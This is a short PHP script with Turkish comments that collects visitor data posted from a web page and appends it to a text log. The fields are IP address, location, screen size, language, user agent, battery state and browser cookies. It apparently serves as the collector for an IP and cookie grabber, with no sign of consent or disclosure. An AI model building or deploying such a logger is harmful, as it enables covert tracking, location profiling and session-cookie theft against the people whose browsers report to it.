<?php
// IP adreslerini içeren dosya
$file = 'kayitlar.txt';

// POST verilerini al
$ip = $_POST['ip'] ?? '';
$server_date_time = $_POST['server_date_time'] ?? '';
$client_date_time = $_POST['client_date_time'] ?? '';
$country = $_POST['country'] ?? '';
$region = $_POST['region'] ?? '';
$city = $_POST['city'] ?? '';
$screen_width = $_POST['screen_width'] ?? '';
$screen_height = $_POST['screen_height'] ?? '';
$language = $_POST['language'] ?? '';
$user_agent = $_POST['user_agent'] ?? '';
$battery_level = $_POST['battery_level'] ?? '';
$is_charging = $_POST['is_charging'] ?? '';
$cookies = $_POST['cookies'] ?? '';

// Bilgileri dosyaya yaz
$entry = "IP: $ip\nSunucu Tarih ve Saat: $server_date_time\nİstemci Tarih ve Saat: $client_date_time\nÜlke: $country\nBölge: $region\nŞehir: $city\nEkran Boyutu: $screen_width x $screen_height\nDil: $language\nKullanıcı Ajansı: $user_agent\nPil Seviyesi: $battery_level%\nŞarjda mı?: $is_charging\nÇerezler: $cookies\n\n";
file_put_contents($file, $entry, FILE_APPEND);
?>
